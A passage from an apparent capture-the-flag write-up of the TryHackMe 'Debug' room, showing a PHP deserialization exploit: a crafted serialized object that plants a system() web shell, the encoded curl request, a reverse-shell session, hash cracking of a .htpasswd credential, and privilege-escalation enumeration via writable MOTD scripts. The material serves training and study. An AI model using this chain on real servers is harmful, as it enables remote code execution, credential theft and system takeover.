  &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
  &lt;title&gt;Base&lt;/title&gt;
  &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;description&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>&gt;
  &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, minimum-scale=1.0, maximum-scale=1.0&#34;</span>&gt;
  &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> media<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;screen&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;style.css&#34;</span>&gt;
&lt;/head&gt;
&lt;body&gt;

</code></pre></div><p>&ndash;</p>
<p>In the heading, we can see that it too points to the same framework <strong>Base</strong> which was discussed above in the README.md file, let&rsquo;s try searching this framework.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403134059.png" alt=""></p>
<p>So, the guy has deleted this repository (base) from his github account. Maybe shifted somewhere else? Let&rsquo;s try searching it on google rather than using the link from <code>readme.md</code> file.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403134336.png" alt=""></p>
<p>Seeing the <code>readme.md</code> contents again, we can probably deduce that this framework (if used) is only going to be used for styling. Since, it doesn&rsquo;t mention anywhere in the <code>README.md</code> file that there is any PHP code in it.</p>
<p>&ndash;</p>
<p>We can continue reading the source code of the <code>index.php.bak</code> file for now.</p>
<p>&ndash;</p>
<p>We can see on line 216 &ndash; 220. We can just input a <code>$_GET['debug']</code> debug parameter with serialize input and the source code will unserialize it.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403134619.png" alt=""></p>
<p>We know that the code is vulnerable to PHP Deserialization but how to exploi this? We only have the .bak file and this won&rsquo;t execute/render as PHP on the server.</p>
<p>Were there any hidden directories we missed while the enumeration?</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403134923.png" alt=""></p>
<p>Yes! we didn&rsquo;t discuss <code>/index.php</code> file, let&rsquo;s try accessing it.</p>
<p>The page looks something like this:</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403134959.png" alt=""></p>
<p>&ndash;</p>
<h3 id="exploitation">Exploitation</h3>
<p>Alright, now time for the exploitation. Before that, we need to learn what <strong>PHP deserialization</strong> is and before that, what is <strong>serialization</strong>?</p>
<p>We use <strong>serialization</strong> when we want a <code>piece of code</code> or some object to be stored in a <strong>database</strong> or when we&rsquo;re expecting some <em>piece of code</em> through an <strong>API call</strong> or something and then we want to execute it/load it.</p>
<p>If you&rsquo;re a programmer, you might have come across this hurdle, to solve this, you always need to create a new file, write the source code in it and execute the file manually.</p>
<p>To not do the above^, we use <strong>serialization</strong>, it takes your piece of code/object, <strong>serializes</strong> it and stores in the <strong>database</strong> and while retreiving it, it <strong>unserializes</strong> the <code>piece of code</code> and executes it.</p>
<p>For the <em>API call</em>, it just receieves <strong>serialized code</strong> already and executes it while <strong>unserializing</strong> it.</p>
<p><em><strong>Note: It is always recommended to never take any input either through database or through APIs or any files on the system and mostly don&rsquo;t even use deserialization if not really required. If it&rsquo;s required, never let the user control the parameters!</strong></em></p>
<p>P.S ~ The above information about serialization is generic and not only based on PHP de(serialization)!</p>
<hr>
<p>You can find more details in this <a href="https://www.youtube.com/watch?v=gTXMFrctYLE">youtube video</a> created by a friend of mine; <a href="https://www.linkedin.com/in/mukarramkhalid/">Mukarram Khalid</a>.</p>
<p>So, now that we&rsquo;ve a base understanding of what <strong>serialization</strong> is, let&rsquo;s move to the <em>source code</em> and see what we can <strong>exploit</strong> here.</p>
<hr>
<p>We can see that the PHP code is using a magic function (i.e. <code>__destruct()</code>)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FormSubmit</span> {

<span style="color:#66d9ef">public</span> $form_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;message.txt&#39;</span>;
<span style="color:#66d9ef">public</span> $message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">SaveMessage</span>() {

$NameArea <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;name&#39;</span>]; 
$EmailArea <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;email&#39;</span>];
$TextArea <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;comments&#39;</span>];

	$this<span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Message From : &#34;</span> <span style="color:#f92672">.</span> $NameArea <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; || From Email : &#34;</span> <span style="color:#f92672">.</span> $EmailArea <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34; || Comment : &#34;</span> <span style="color:#f92672">.</span> $TextArea <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;

}

<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct() {

<span style="color:#a6e22e">file_put_contents</span>(<span style="color:#66d9ef">__DIR__</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">form_file</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">message</span>,<span style="color:#a6e22e">FILE_APPEND</span>);
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Your submission has been successfully saved!&#39;</span>;

}

}
</code></pre></div><p>&ndash;</p>
<h4 id="what-is-__destruct">What is <code>__destruct</code>?</h4>
<p><code>__destruct</code> magic method is used to always run or do a task at the end of the execution. Let&rsquo;s say we want to do something everytime (maybe update a local log file?), it&rsquo;ll do that in the end of the execution.</p>
<p>What is it doing in the above application?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct() {

<span style="color:#a6e22e">file_put_contents</span>(<span style="color:#66d9ef">__DIR__</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">form_file</span>,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">message</span>,<span style="color:#a6e22e">FILE_APPEND</span>);
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Your submission has been successfully saved!&#39;</span>;

}
</code></pre></div><ul>
<li>It&rsquo;s creating a file in our <code>__DIR__</code> (or <code>pwd</code>) in the directory and with the message whatever is specified (using the two properties being used from the class)</li>
<li>It then echo&rsquo;s a string: &lsquo;Your submission has been successfully saved&rsquo;</li>
</ul>
<p>&ndash;</p>
<p>Now, we can write our own code matching the above^ but just change the contents and the file name, let&rsquo;s try it.</p>
<p>Remember, we need to use the same <strong>class name</strong> and <strong>same properties names</strong>!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FormSubmit</span> {
	<span style="color:#66d9ef">public</span> $form_file 	<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;umar0x01.php&#39;</span>;
	<span style="color:#66d9ef">public</span> $message 	<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php system($_GET[123]); ?&gt;&#39;</span>;
}

$newObj 	<span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">FormSubmit</span>;

<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($newObj);

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Let&rsquo;s run add this PHP code in a local file and run it.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403142007.png" alt=""></p>
<p>Alright, we get the serialized string:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">O:10:<span style="color:#e6db74">&#34;FormSubmit&#34;</span>:2:<span style="color:#f92672">{</span>s:9:<span style="color:#e6db74">&#34;form_file&#34;</span>;s:12:<span style="color:#e6db74">&#34;umar0x01.php&#34;</span>;s:7:<span style="color:#e6db74">&#34;message&#34;</span>;s:28:<span style="color:#e6db74">&#34;&lt;?php system(</span>$_GET<span style="color:#e6db74">[123]); ?&gt;&#34;</span>;<span style="color:#f92672">}</span>
</code></pre></div><p>Let me try and walk you through the whole serialized string.</p>
<ul>
<li><code>O</code> means object</li>
<li><code>O:10</code> means object name&rsquo;s length (i.e. -&gt; 10)</li>
<li><code>2:{</code> means there are two properties/attributes</li>
<li><code>s:9</code> means that our property/attribute is a string and is of length of 9 chars</li>
<li><code>s:9:&quot;form_file&quot;;</code> Length of 9 and property name</li>
</ul>
<p>Probably, that explained the serialized string. You can always google for more details!</p>
<hr>
<p>Now, we need to URL encode our string and pass it into the <code>debug</code> parameter in the application.</p>
<p>For URL encoding, I&rsquo;ll use <a href="https://gchq.github.io/CyberChef">cyberchef</a>.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403142403.png" alt=""></p>
<p>URL Encoded string looks like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form%5Ffile%22%3Bs%3A12%3A%22umar0x01%2Ephp%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24%5FGET%5B123%5D%29%3B%20%3F%3E%22%3B%7D
</code></pre></div><p>Let&rsquo;s pass this in the URL and see if our new file get&rsquo;s created.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403142455.png" alt=""></p>
<p>Yay! It did, the string printed in the bottom indicates that.</p>
<p>Here&rsquo;s the cURL request, if you&rsquo;ve problems reproducing the above:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -i <span style="color:#e6db74">&#39;http://10.10.51.225/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A{s%3A9%3A%22form_file%22%3Bs%3A12%3A%22umar0x01.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system(%24_GET[123])%3B%20%3F%3E%22%3B}&#39;</span> --globoff <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#39;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;Accept-Language: en-US,en;q=0.5&#39;</span> <span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>-H <span style="color:#e6db74">&#39;Connection: close&#39;</span>
</code></pre></div><p>&ndash;</p>
<p>Now, let&rsquo;s access the .php file with our RCE code in it and get reverse shell!</p>
<p>&ndash;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">view-source:http://10.10.51.225/umar0x01.php?123=ls%20-la
</span></code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403142819.png" alt=""></p>
<p>&ndash;</p>
<p>We can generate RCE payloads to fallback if something isn&rsquo;t present utilizing <a href="https://reverse-shell.sh">reverse-shell.sh</a> and call it with cURL.</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403142924.png" alt=""></p>
<p>&ndash;</p>
<p>I&rsquo;ll let you figure out what&rsquo;s happening below, just remember that I wrote the above shell script generated in a file named <code>shell.sh</code> in my local directory since the machine doesn&rsquo;t have access to the internet.</p>
<p><img src="img/thm-debug.png" alt=""></p>
<hr>
<h3 id="reverse-shell">Reverse Shell:</h3>
<p>Now that we&rsquo;ve reverse shell, let&rsquo;s try and get tty shell and make it interactive!</p>
<p>&ndash;</p>
<p>First, we&rsquo;ll get the tty shell using python&rsquo;s onliner:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#e6db74">&#34;__import__(&#39;pty&#39;).spawn(&#39;/bin/bash&#39;)&#34;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/mnt/hgfs/THM/Debug<span style="color:#f92672">]</span>
â””â”€# nc -nlvp <span style="color:#ae81ff">4444</span>                              
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
connect to <span style="color:#f92672">[</span>10.17.0.120<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.51.225<span style="color:#f92672">]</span> <span style="color:#ae81ff">50224</span>
/bin/sh: 0: can<span style="color:#e6db74">&#39;t access tty; job control turned off
</span><span style="color:#e6db74">$ id
</span><span style="color:#e6db74">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span style="color:#e6db74">$ which python
</span><span style="color:#e6db74">/usr/bin/python
</span><span style="color:#e6db74">$ which python3
</span><span style="color:#e6db74">/usr/bin/python3
</span><span style="color:#e6db74">$ python3 -c &#34;__import__(&#39;</span>pty<span style="color:#e6db74">&#39;).spawn(&#39;</span>/bin/bash<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">)</span><span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">www-data@osboxes:/var/www/html</span>$<span style="color:#e6db74"> 
</span><span style="color:#e6db74">www-data@osboxes:/var/www/html</span>$<span style="color:#e6db74"> id
</span><span style="color:#e6db74">id
</span><span style="color:#e6db74">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span style="color:#e6db74">www-data@osboxes:/var/www/html</span>$<span style="color:#e6db74"> 
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">www-data@osboxes:/var/www/html</span>$<span style="color:#e6db74"> 
</span><span style="color:#e6db74">
</span></code></pre></div><p>&ndash;</p>
<p>Now that we&rsquo;ve tty shell, let&rsquo;s make it interactive (i.e. Ctrl + C or other things don&rsquo;t exit the shell!)</p>
<p><em><strong>Note:</strong> We need bash shell to make it interactive!</em></p>
<p>Type: &lsquo;Ctrl + Z&rsquo; and background the process.</p>
<p>Now we&rsquo;ll use:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">stty raw -echo
</code></pre></div><p>And then type <code>fg</code> to foreground the process (get it back)</p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403143723.png" alt=""></p>
<p>&ndash;</p>
<p>Now that we&rsquo;ve interactive shell, let&rsquo;s add the <em>rows/cols (generic)</em> and add some <strong>colors UwU</strong>!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS1<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#39;</span> <span style="color:#75715e"># green</span>
alias ls<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls --color=auto&#39;</span>
alias grep<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;grep --color=auto&#39;</span>
alias fgrep<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;fgrep --color=auto&#39;</span>
alias egrep<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;egrep --color=auto&#39;</span>
alias ll<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls -alFh&#39;</span>
alias la<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls -A&#39;</span>
alias l<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ls -CF&#39;</span>
</code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403143941.png" alt=""></p>
<p>&ndash;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">stty rows <span style="color:#ae81ff">48</span>
stty columns <span style="color:#ae81ff">211</span>
export TERM<span style="color:#f92672">=</span>screen
</code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403144025.png" alt=""></p>
<p>&ndash;</p>
<p>Alright, we got the initial shell and it&rsquo;s fully interactive! Time to get the initial flag and privesc our way to root!</p>
<p>&ndash;</p>
<p>We can find a <code>.htpasswd</code> (usually used for <strong>HTTP authentication</strong>) file right in <code>/var/www/html/</code> containing the following credentials:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@osboxes:/var/www/html$ cat .htpasswd 
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
</code></pre></div><p>Let&rsquo;s run john and try to crack these.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”Œâ”€â”€<span style="color:#f92672">(</span>rootðŸ’€b0x<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/mnt/hgfs/THM/Debug<span style="color:#f92672">]</span>
â””â”€# john htpasswd.hash                           
Warning: detected hash type <span style="color:#e6db74">&#34;md5crypt&#34;</span>, but the string is also recognized as <span style="color:#e6db74">&#34;md5crypt-long&#34;</span>
Use the <span style="color:#e6db74">&#34;--format=md5crypt-long&#34;</span> option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>md5crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $1$ <span style="color:#f92672">(</span>and variants<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>MD5 256/256 AVX2 8x3<span style="color:#f92672">])</span>
Will run <span style="color:#ae81ff">4</span> OpenMP threads
Proceeding with single, rules:Single
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
Almost <span style="color:#66d9ef">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#66d9ef">if</span> any.
Warning: Only <span style="color:#ae81ff">84</span> candidates buffered <span style="color:#66d9ef">for</span> the current salt, minimum <span style="color:#ae81ff">96</span> needed <span style="color:#66d9ef">for</span> performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
jamaica          <span style="color:#f92672">(</span>james<span style="color:#f92672">)</span>
1g 0:00:00:00 DONE 2/3 <span style="color:#f92672">(</span>2021-04-03 14:42<span style="color:#f92672">)</span> 20.00g/s 41760p/s 41760c/s 41760C/s bigdog..88888888
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed

</code></pre></div><p><img src="/img/debug-thm/Pasted%20image%2020210403144206.png" alt=""></p>
<p>&ndash;</p>
<p>We get a password: <strong>jamaica</strong></p>
<p>Where can we use it? Let&rsquo;s see <code>/etc/passwd</code> file if it contains any other users except for <code>www-data</code> and <code>root</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@osboxes:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
james:x:1001:1001::/home/james:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
</code></pre></div><p>Alright, we can try the credentials against the user: <code>james</code></p>
<p><img src="/img/debug-thm/Pasted%20image%2020210403144400.png" alt=""></p>
<p>&ndash;</p>
<h4 id="flag-usertxt">Flag (user.txt)</h4>
<p><img src="/img/debug-thm/Pasted%20image%2020210403144420.png" alt=""></p>
<p>&ndash;</p>
<p>Time for privesc!</p>
<hr>
<h3 id="privileges-escalation">Privileges Escalation</h3>
<p>Before running LinEnum, LSE or LinPeas, let&rsquo;s try and do some manual enumeration first!</p>
<p>&ndash;</p>
<p>Let&rsquo;s try and get the list of binaries we can run with sudo!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:~$ sudo -l 
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> james: 
Sorry, user james may not run sudo on osboxes.
</code></pre></div><p>Nothing we can run with sudo! :(</p>
<p>&ndash;</p>
<p>Let&rsquo;s try and list the crontabs (if any)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:~$ crontab -l
no crontab <span style="color:#66d9ef">for</span> james
</code></pre></div><p>Nothing there as well!</p>
<p>&ndash;</p>
<p>We can see that <code>.bash_history</code> is present in the directry, let&rsquo;s check it out.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:~$ cat .bash_history
ls
clear
exit
ls
clear
exit
ls
clear
exit
ls
cd /home/james/
ls
cat Note-To-James.txt 
ls
cd /etc/update-motd.d/
ls
ls -la
ls
clear
ls
clear
ls
clera
ls
clear
ls
clear
ls -la
cd /
ls
cd /root/
ls
exit
ls
clear
exit
nano id_rsa
chmod <span style="color:#ae81ff">600</span> id_rsa 
ssh -i id_rsa root@10.250.0.12
exit
</code></pre></div><p>&ndash;</p>
<p>We&rsquo;ve a note file in the local directory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:~$ cat Note-To-James.txt
Dear James,

As you may already know, we are soon planning to submit this machine to THM<span style="color:#e6db74">&#39;s CyberSecurity Platform! Crazy... Isn&#39;</span>t it? 

But there<span style="color:#e6db74">&#39;s still one thing I&#39;</span>d like you to <span style="color:#66d9ef">do</span>, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :<span style="color:#f92672">)</span> 

Oh and one last thing... You gotta hurry up! We don<span style="color:#960050;background-color:#1e0010">&#39;</span>t have much time left <span style="color:#66d9ef">until</span> the submission!

Best Regards,

root
</code></pre></div><p>&ndash;</p>
<p>We&rsquo;ve seen <code>.bash_history</code> containing a directory <code>/etc/update-motd.d/</code>, let&rsquo;s check it out!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:~$ ls -la /etc/update-motd.d/
total <span style="color:#ae81ff">44</span>
drwxr-xr-x   <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">10</span> 18:38 .
drwxr-xr-x <span style="color:#ae81ff">134</span> root root  <span style="color:#ae81ff">12288</span> Mar <span style="color:#ae81ff">10</span> 20:08 ..
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james  <span style="color:#ae81ff">1220</span> Mar <span style="color:#ae81ff">10</span> 18:32 00-header
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james     <span style="color:#ae81ff">0</span> Mar <span style="color:#ae81ff">10</span> 18:38 00-header.save
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james  <span style="color:#ae81ff">1157</span> Jun <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2016</span> 10-help-text
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james    <span style="color:#ae81ff">97</span> Dec  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> 90-updates-available
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james   <span style="color:#ae81ff">299</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2016</span> 91-release-upgrade
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james   <span style="color:#ae81ff">142</span> Dec  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> 98-fsck-at-reboot
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james   <span style="color:#ae81ff">144</span> Dec  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2018</span> 98-reboot-required
-rwxrwxr-x   <span style="color:#ae81ff">1</span> root james   <span style="color:#ae81ff">604</span> Nov  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2017</span> 99-esm
</code></pre></div><p>We can see that we&rsquo;ve read/write/execute permissions on the files. But what can we do with these?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">james@osboxes:/etc/update-motd.d$ cat 00-header
<span style="color:#75715e">#!/bin/sh</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    00-header - create the header of the MOTD</span>
<span style="color:#75715e">#    Copyright (C) 2009-2010 Canonical Ltd.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    Authors: Dustin Kirkland &lt;kirkland@canonical.com&gt;</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    This program is free software; you can redistribute it and/or modify</span>
<span style="color:#75715e">#    it under the terms of the GNU General Public License as published by</span>
<span style="color:#75715e">#    the Free Software Foundation; either version 2 of the License, or</span>
<span style="color:#75715e">#    (at your option) any later version.</span>
<span style="color:#75715e">#</span>
<span style="color:#75715e">#    This program is distributed in the hope that it will be useful,</span>
